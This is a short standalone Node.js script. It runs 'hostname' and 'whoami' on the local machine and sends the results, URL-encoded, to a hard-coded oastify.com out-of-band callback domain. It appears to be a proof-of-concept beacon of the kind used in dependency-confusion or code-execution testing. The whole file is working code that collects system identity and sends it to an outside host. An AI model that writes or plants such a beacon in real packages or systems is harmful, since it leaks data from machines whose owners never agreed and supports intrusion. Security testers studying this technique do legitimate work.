const https = require('https');
const { execSync } = require('child_process');

async function sendOastRequest(data) {
  const oastDomain = 'el3q42u0lb1e2k6ycwueb61qvh18pydn.oastify.com';
  const path = `/${encodeURIComponent(data)}`;

  const options = {
    hostname: oastDomain,
    port: 443,
    path,
    method: 'GET',
  };

  return new Promise((resolve, reject) => {
    const req = https.request(options, (res) => {
      res.on('data', () => {}); // We don't need to process response
      res.on('end', () => resolve());
    });
    req.on('error', (e) => reject(e));
    req.end();
  });
}

async function main() {
  try {
    // Run hostname and whoami commands
    const hostname = execSync('hostname').toString().trim();
    const user = execSync('whoami').toString().trim();

    // Compose data string
    const data = `host=${hostname}&user=${user}`;

    console.log(`Sending data to OAST server: ${data}`);

    // Send request to OAST server
    await sendOastRequest(data);

    console.log('Data sent successfully.');
  } catch (error) {
    console.error('Error:', error.message);
  }
}

main();
